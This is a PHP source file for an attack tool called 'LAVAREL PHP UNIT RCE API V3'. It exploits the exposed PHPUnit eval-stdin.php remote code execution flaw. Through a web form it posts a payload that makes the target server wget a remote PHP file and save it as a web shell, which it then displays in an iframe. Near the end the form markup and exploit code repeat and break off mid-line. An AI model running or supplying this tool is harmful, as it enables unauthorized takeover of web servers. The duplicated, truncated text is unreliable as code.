<?php
// REPORTING
error_reporting(5);
@ignore_user_abort(TRUE);
@set_magic_quotes_runtime(0);

// SET TIME
@set_time_limit(0);

$shellname = $_POST['shellname'];
$url = $_POST['url'];
$foundfile = $url."/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php";
$shellfound = $url."/vendor/phpunit/phpunit/src/Util/PHP/".$shellname;
$actual_link = $_SERVER["HTTP_HOST"];

echo '
<!DOCTYPE html>
<html>
<head>

<title>
LAVAREL PHP UNIT RCE API V3
</title>

</head>

<style>
@import url(https://fonts.googleapis.com/css?family=Aldrich);

body{
background: black;
font-family:"Aldrich";
padding: 80px;
}

input{
width: 700px;
background: transparent;
border: 3px solid red;
border-radius: 5px;
}

button{
background: transparent;
color: red;
border-radius: 5px;
border: 2px solid red;
font-family: "Aldrich";
height: 30px;
font-weight: bold;
}
</style>

<body>

<center>
<pre>
<img src="https://i.ibb.co/d54FhCc/20191018-013627.png" width="800">
<img src="https://i.ibb.co/mC0fq7Z/20191018-021741.png" width="700">
</pre>

<form method="POST">
<p style="color:#58FAF4; font-size:25px; font-weight: bold;">
-:: U R L W E B S I T E ::-
</p>
<input type="text" name="url">

<br>

<p style="color:#58FAF4; font-weight:bold;">
[ SHELL NAME EXAMPLE SHELL.PHP ]
</p>

<input type="text" name="shellname">

<br><br>

<button type="Submit" name="AutoShell">
AUTO EXPLOIT AND UPLOAD SHELL
</button>

<br>

<p style="color:red; font-weight:bold;">
COPYRIGHT &COPY; 2K16 POWERED BY BLACK CODERS ANONYMOUS
<br>
[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; VERSION 3.0 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;]
</p>

<br>
<br>

</form>
</center>';

if(isset($_POST['AutoShell']))
{

system("curl --data \"<?system('wget https://raw.githubusercontent.com/your-github-name/your-repositoryy/master/your-file.php -O ".$shellname."');?>\" -X GET ".$url."/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php");

echo '<iframe style="height: 1000px; width: 1550px;" src="'.$url."/vendor/phpunit/phpunit/src/Util/PHP/".$shellname.'"></iframe>'; 

}
?>ht: bold;">
-:: U R L W E B S I T E ::-
</p>
<input type="text" name="url">

<br>

<p style="color:#58FAF4; font-weight:bold;">
[ SHELL NAME EXAMPLE SHELL.PHP ]
</p>

<input type="text" name="shellname">

<br><br>

<button type="Submit" name="AutoShell">
AUTO EXPLOIT AND UPLOAD SHELL
</button>

<br>

<p style="color:red; font-weight:bold;">
<br>
[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; VERSION 3.0 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;]
</p>

<br>
<br>

</form>
</center>';

if(isset($_POST['AutoShell']))
{

system("curl --data \"<?system('wget https://raw.githubusercontent.com/your-github-name/your-repositoryy/master/your-file.php -O ".$shellname."');?>\" -X GET ".$url."/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php");

echo '<iframe s